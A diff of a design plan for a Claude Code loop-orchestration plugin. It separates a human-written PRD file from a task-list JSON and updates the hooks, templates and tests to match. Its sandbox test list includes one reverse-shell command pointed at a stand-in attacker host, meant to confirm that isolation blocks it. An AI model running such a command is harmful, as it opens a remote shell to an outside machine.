@@ -2,7 +2,7 @@
 
 ## Context
 
-The Ralph Loop is an outer orchestration pattern that repeatedly invokes Claude Code CLI against file-based specifications. Each iteration gets a fresh context window, avoiding context rot. State persists on disk between iterations via progress files, PRD task lists, and memory files. A bash script drives the loop.
+The Ralph Loop is an outer orchestration pattern that repeatedly invokes Claude Code CLI against file-based specifications. Each iteration gets a fresh context window, avoiding context rot. State persists on disk between iterations via progress files, task lists, and memory files. A bash script drives the loop.
 
 This plan builds a **standalone `ralph` plugin** under `claude-code/plugins/ralph/`, separate from the `zaksak` plugin. This keeps the ralph workflow self-contained and independently installable via the marketplace. The design draws from the synthesized research in `research/ralph-loops/`. Key differentiators from reference implementations: **Docker Sandbox microVM isolation** as the primary safety mechanism (with a PreToolUse hook blocklist as fallback), explicit separation of loop-scoped vs repo-scoped memory, context-aware wrap-up guidance, and self-managing task iteration.
 
@@ -10,7 +10,7 @@ This plan builds a **standalone `ralph` plugin** under `claude-code/plugins/ralp
 
 - **Claude Code CLI** installed on host
 - **Docker Desktop 4.58+** with Sandboxes enabled (recommended for primary safety mode)
-- `jq` (for PRD verification in `ralph.sh`)
+- `jq` (for task list verification in `ralph.sh`)
 - macOS with Apple Silicon (primary target); Windows experimental, Linux legacy container mode
 - If Docker is unavailable, the plugin falls back to a PreToolUse hook blocklist (see `pretooluse-hook-reference.md`)
 
@@ -28,7 +28,7 @@ claude-code/plugins/ralph/
 │   ├── hooks.json                           # NEW: plugin hook definitions
 │   └── scripts/
 │       ├── context_monitor.py              # NEW: PostToolUse context usage alerts
-│       └── stop_loop_reminder.py            # NEW: Stop hook — PRD validation + enforce commit
+│       └── stop_loop_reminder.py            # NEW: Stop hook — tasks.json validation + enforce commit
 ├── sandbox/
 │   ├── Dockerfile                           # NEW: custom sandbox template
 │   └── entrypoint.sh                        # NEW: auth symlink + Claude launch
@@ -38,7 +38,8 @@ claude-code/plugins/ralph/
 │   └── ralph-archive.sh                     # NEW: archive a completed loop
 └── templates/
     ├── prompt.md                            # NEW: per-iteration prompt template
-    ├── prd-template.json                    # NEW: task list starter
+    ├── prd-template.md                      # NEW: PRD scaffold (requirements context)
+    ├── tasks-template.json                  # NEW: task list starter (execution state)
     └── progress-template.md                 # NEW: progress log starter
 ```
 
@@ -49,7 +50,8 @@ When a user runs `ralph-init.sh` in their target project, it creates:
 ```
 target-project/
 ├── ralph/
-│   ├── prd.json          # Task list (copied from template, user fills in)
+│   ├── prd.md            # Requirements context (human-written, static during loop)
+│   ├── tasks.json        # Task list / execution state (Claude-modified)
 │   ├── progress.txt      # Append-only iteration log (loop-scoped memory)
 │   └── prompt.md         # Iteration prompt (copied, customizable per-project)
 └── .ralph-active          # Runtime marker (created by ralph.sh, gitignored)
@@ -98,8 +100,8 @@ Core behavior:
 - Uses `sed` to inject `$RALPH_ITERATION` and `$RALPH_MAX_ITERATIONS` into the prompt before passing to Claude
 - Creates `.ralph-active` marker file on start (JSON with timestamp, pid, max_iterations, mode) — hooks check for this file to activate ralph-specific behavior
 - Registers `trap` to clean up `.ralph-active` on EXIT/INT/TERM
-- Detects completion via `<promise>COMPLETE</promise>` in output, then verifies with `jq` that all PRD stories have `passes: true`
-- Falls back to PRD-only check (if agent completed everything but forgot the tag)
+- Detects completion via `<promise>COMPLETE</promise>` in output, then verifies with `jq` that all stories in `tasks.json` have `passes: true`
+- Falls back to tasks.json-only check (if agent completed everything but forgot the tag)
 - Streams output to terminal via `tee /dev/stderr` while capturing for promise detection
 - In sandbox mode, adds a 2-second sleep between iterations to allow file sync to settle
 - Exits 0 on completion, 1 on max iterations reached
@@ -116,7 +118,7 @@ ralph.sh [OPTIONS]
   -h, --help                Show usage
 ```
 
-Dependencies: `jq` (for PRD verification), `claude` CLI. Docker Desktop 4.58+ recommended for sandbox mode.
+Dependencies: `jq` (for tasks.json verification), `claude` CLI. Docker Desktop 4.58+ recommended for sandbox mode.
 
 ### 4. Safety Isolation — Docker Sandbox
 
@@ -135,7 +137,7 @@ See `docker-sandbox-isolation.md` for full setup, architecture diagram, network 
 
 **File:** `claude-code/plugins/ralph/hooks/hooks.json`
 
-Wires two hooks across two events (PostToolUse, Stop), plus a SessionStart cleanup. All hook scripts are written in Python for consistency, robust JSON handling (no `jq` dependency), and cleaner PRD validation logic. These hooks run inside the Docker Sandbox when sandbox mode is active.
+Wires two hooks across two events (PostToolUse, Stop), plus a SessionStart cleanup. All hook scripts are written in Python for consistency, robust JSON handling (no `jq` dependency), and cleaner tasks.json validation logic. These hooks run inside the Docker Sandbox when sandbox mode is active.
 
 #### 5a. Context Monitor (Always-on, graduated alerts)
 
@@ -169,7 +171,7 @@ Fires graduated alerts at 5 thresholds — each threshold triggers only once per
 
 Runs two checks before allowing Claude to stop. Both must pass or the stop is blocked:
 
-**Check 1: PRD schema validation** — Validates `ralph/prd.json` structure with `jq`:
+**Check 1: Task list schema validation** — Validates `ralph/tasks.json` structure:
 - File exists and is valid JSON
 - Required top-level fields: `project`, `branchName`, `description`, `userStories` (array)
 - Every story has required fields: `id` (string), `title` (string), `passes` (boolean), `priority` (number), `acceptanceCriteria` (non-empty array)
@@ -181,10 +183,10 @@ Runs two checks before allowing Claude to stop. Both must pass or the stop is bl
 - If uncommitted changes exist → block, telling Claude to:
   1. Update `ralph/progress.txt` with what was accomplished + learnings
   2. Consider if any lasting patterns belong in CLAUDE.md or `.claude/rules/`
-  3. Commit ALL changes including progress.txt and prd.json updates
+  3. Commit ALL changes including progress.txt and tasks.json updates
 - Claude must address the feedback and try stopping again
 
-If both checks pass (valid PRD + no uncommitted changes), approves the stop.
+If both checks pass (valid task list + no uncommitted changes), approves the stop.
 
 ### 6. Prompt Template
 
@@ -193,23 +195,56 @@ If both checks pass (valid PRD + no uncommitted changes), approves the stop.
 The prompt Claude receives each iteration. Structure:
 
 1. **Header** — Identifies this as Ralph Loop iteration N of M
-2. **Step 1: Orient** — Read progress.txt (especially Codebase Patterns section at top), read prd.json, check `git log` and `git status`
-3. **Step 2: Select & Right-Size** — Pick highest-priority story where `passes: false` (respecting `dependsOn`). If too large for the context window (~60% of context is usable working space), break it into sub-stories in prd.json and work on the first one. Claude can also add new tasks, reorder priorities, or restructure the task list as needed.
-4. **Step 3: Implement** — Read existing code first, follow patterns, implement one story, run project verification commands (from `prd.json.verifyCommands`)
+2. **Step 1: Orient** — Read progress.txt (especially Codebase Patterns section at top), read prd.md for requirements context, read tasks.json for task state, check `git log` and `git status`
+3. **Step 2: Select & Right-Size** — Pick highest-priority story where `passes: false` (respecting `dependsOn`). If too large for the context window (~60% of context is usable working space), break it into sub-stories in tasks.json and work on the first one. Claude can also add new tasks, reorder priorities, or restructure the task list as needed.
+4. **Step 3: Implement** — Read existing code first, follow patterns, implement one story, run project verification commands (from `tasks.json.verifyCommands`). Respect constraints from prd.md throughout.
 5. **Step 4: Document Progress** — Append structured entry to progress.txt (what was done, files changed, verification results, learnings). Curate the Codebase Patterns section at the top with reusable discoveries
 6. **Step 5: Consider Memory Updates** — Update CLAUDE.md or `.claude/rules/` ONLY for rules that persist beyond this ralph loop (e.g., "this project uses bun not npm"). Skip this step if nothing universal was learned
-7. **Step 6: Commit & Signal** — Set `passes: true` in prd.json, commit with `feat: [US-xxx] - [Title]`, check if ALL stories complete → output `<promise>COMPLETE</promise>`
+7. **Step 6: Commit & Signal** — Set `passes: true` in tasks.json, commit with `feat: [US-xxx] - [Title]`, check if ALL stories complete → output `<promise>COMPLETE</promise>`
 
 Hard rules embedded in the prompt:
 - One story per iteration, never start a second
 - Don't mark `passes: true` until verification passes
 - Don't weaken tests to make them pass
 - If stuck, document the blocker in progress.txt for the next iteration
-- Claude may add/split/reorder stories in prd.json as needed (self-management)
+- Claude may add/split/reorder stories in tasks.json as needed (self-management)
+- prd.md is read-only — never modify the PRD during the loop
 
 ### 7. PRD Template
 
-**File:** `claude-code/plugins/ralph/templates/prd-template.json`
+**File:** `claude-code/plugins/ralph/templates/prd-template.md`
+
+The human-written requirements document that Claude reads each iteration for context. Adapted from the project's `docs/PRD_TEMPLATE.md`, stripped of execution-tracking sections (those live in tasks.json). Static during the loop — Claude reads but never modifies this file.
+
+Sections (annotated with complexity tiers from S-Patch to L-Epic):
+
+1. **Summary** _(Required, all tiers)_ — 2-4 sentences: what is being built, who it's for, expected outcome
+2. **Problem Statement** _(Required, all tiers)_ — Current state, why it's a problem, what triggers this work
+3. **Goals** _(Required M/L, Optional S)_ — 3-6 specific, measurable outcomes
+4. **Non-Goals** _(Required M/L, Recommended S)_ — Explicit scope boundaries. The most important section for AI agents — prevents over-engineering and unrequested changes
+5. **Background & Context** _(Recommended M/L)_ — Architecture overview, key file paths, existing patterns to follow, database schema context, terminology
+6. **Technical Design** _(Required, all tiers)_ — Subsections as needed:
+   - 6a. Database Changes (DDL, indexes, RLS)
+   - 6b. API Contracts (method, path, request/response JSON, errors)
+   - 6c. Core Logic Changes (pseudocode, step-by-step algorithms)
+   - 6d. Frontend Changes (components, data flow, interaction flow)
+   - 6e. Infrastructure / Config Changes
+7. **Constraints** _(Recommended M/L)_ — Cross-cutting invariants that apply to ALL stories across every iteration. Rules Claude must respect regardless of which task is active:
+   - Technical constraints ("All monetary values stored as NUMERIC(10,2), never floats")
+   - Library/pattern mandates ("Use spatie/laravel-enum, not native PHP enums")
+   - Integration rules ("All new endpoints must be idempotent")
+   - Behavioral invariants ("Custom prices always take precedence over default prices")
+8. **Edge Cases & Error Handling** _(Recommended M/L)_ — Scenario / Trigger / Expected Behavior / Error table
+9. **Risks & Mitigations** _(Recommended M/L)_ — Risk / Likelihood / Impact / Mitigation table
+10. **Open Questions** _(Recommended, all tiers)_ — Unresolved decisions; strikethrough + annotate when resolved
+
+Template provides section headers with HTML comments explaining what to write. User deletes sections they don't need.
+
+### 8. Tasks Template
+
+**File:** `claude-code/plugins/ralph/templates/tasks-template.json`
+
+The machine-readable execution state tracker. Claude reads and modifies this file each iteration to track story completion.
 
 ```json
 {
@@ -238,7 +273,9 @@ Key fields:
 - `passes`: boolean, toggled by Claude when acceptance criteria + verification pass
 - `notes`: Claude appends implementation context for future iterations
 
-### 8. Progress Template
+**Separation of concerns:** prd.md provides the *context* (what, why, constraints, technical design). tasks.json provides the *execution state* (stories, completion, priority). The PRD is the specification; the task list is the checklist.
+
+### 9. Progress Template
 
 **File:** `claude-code/plugins/ralph/templates/progress-template.md`
 
@@ -255,7 +292,7 @@ PRD: {{PROJECT_NAME}}
 
 Append-only after the `---`. The Codebase Patterns section at the top is curated (edited, not just appended) as the loop progresses.
 
-### 9. Utility Scripts
+### 10. Utility Scripts
 
 #### ralph-init.sh
 
@@ -265,9 +302,9 @@ Usage: `ralph-init.sh [--project-dir PATH] [--name FEATURE_NAME]`
 
 What it does:
 1. Creates `ralph/` directory in the target project
-2. Copies template files (prompt.md, prd-template.json → prd.json, progress-template.md → progress.txt)
+2. Copies template files (prompt.md, prd-template.md → prd.md, tasks-template.json → tasks.json, progress-template.md → progress.txt)
 3. Substitutes `{{DATE}}` and `{{PROJECT_NAME}}` in progress.txt
-4. Sets `branchName` in prd.json to `ralph/<name>` if `--name` provided
+4. Sets `branchName` in tasks.json to `ralph/<name>` if `--name` provided
 5. Adds `.ralph-active` to `.gitignore` if not already there
 6. Prints next-steps instructions
 
@@ -279,7 +316,7 @@ Usage: `ralph-archive.sh [--project-dir PATH] [--label LABEL]`
 
 What it does:
 1. Creates `ralph-archive/<date>-<branch-or-label>/`
-2. Moves prd.json and progress.txt to archive
+2. Moves prd.md, tasks.json, and progress.txt to archive
 3. Generates a `summary.md` (stories completed vs total, date range)
 4. Resets `ralph/` to clean state with fresh templates
 5. Commits the archive
@@ -289,7 +326,7 @@ What it does:
 ## Implementation Order
 
 1. **Plugin scaffold** — `.claude-plugin/plugin.json` + `marketplace.json` update
-2. **Templates** — `prd-template.json`, `progress-template.md`, `prompt.md` (static files, no deps)
+2. **Templates** — `prd-template.md`, `tasks-template.json`, `progress-template.md`, `prompt.md` (static files, no deps)
 3. **Sandbox template** — `sandbox/Dockerfile` + `sandbox/entrypoint.sh` (see `docker-sandbox-isolation.md`)
 4. **Hook scripts** — `context_monitor.py`, `stop_loop_reminder.py` (Python, standalone, testable independently)
 5. **hooks.json** — Wire hooks to events (depends on hook scripts)
@@ -311,8 +348,9 @@ What it does:
 | Context reminders         | PostToolUse transcript-size monitor     | Graduated alerts at 50/60/70/80/90% via chars-per-token heuristic on transcript file                                                                                     |
 | Progress.txt format       | Append-only with curated top section    | Loop-scoped memory; patterns section is edited, entries are append-only                                                                                                  |
 | Memory file separation    | progress.txt (loop) vs CLAUDE.md (repo) | Clear boundary: task state vs lasting conventions                                                                                                                        |
-| Completion detection      | Promise tag + PRD verification          | Dual check prevents false completion signals                                                                                                                             |
-| Hook language             | All Python                              | Consistent codebase, built-in JSON handling (no `jq` dep), cleaner PRD validation                                                                                        |
+| PRD / task list separation | prd.md (context) + tasks.json (state)   | PRD is the specification (what, why, constraints); tasks.json is the checklist (stories, completion). Avoids cramming rich requirements into JSON strings                |
+| Completion detection      | Promise tag + tasks.json verification   | Dual check prevents false completion signals                                                                                                                             |
+| Hook language             | All Python                              | Consistent codebase, built-in JSON handling (no `jq` dep), cleaner task list validation                                                                                  |
 | Prompt variable injection | `sed` substitution                      | No external dependency (vs `envsubst` requiring `gettext`)                                                                                                               |
 
 ---
@@ -329,13 +367,13 @@ What it does:
    - `nc -e /bin/bash attacker.com 4444` → should fail (non-HTTP blocked by default)
 3. **Hook scripts** — Test each independently:
    - Create a fake transcript file, pass its path via JSON stdin to `context_monitor.py` → verify alerts fire at correct thresholds and each threshold fires only once
-   - Create `.ralph-active` → run `stop_loop_reminder.py` with valid/invalid prd.json → verify schema validation blocks on malformed PRD, passes on valid
+   - Create `.ralph-active` → run `stop_loop_reminder.py` with valid/invalid tasks.json → verify schema validation blocks on malformed task list, passes on valid
    - Create `.ralph-active` → run `stop_loop_reminder.py` with uncommitted changes → should return block decision
 4. **ralph-init.sh** — Run in a temp directory, verify all files created correctly
-5. **ralph.sh (sandbox mode)** — Run with `--sandbox --max-iterations 1` against a simple single-story PRD in a test project
+5. **ralph.sh (sandbox mode)** — Run with `--sandbox --max-iterations 1` against a simple single-story task list in a test project
 6. **ralph.sh (direct mode)** — Run with `--no-sandbox --max-iterations 1` to verify fallback works
 7. **ralph-archive.sh** — Run after a completed loop, verify archive structure and clean reset
-8. **End-to-end** — Run a 2-3 story PRD through full ralph loop completion in sandbox mode
+8. **End-to-end** — Run a 2-3 story task list through full ralph loop completion in sandbox mode
 
 ## Reference Documents
 
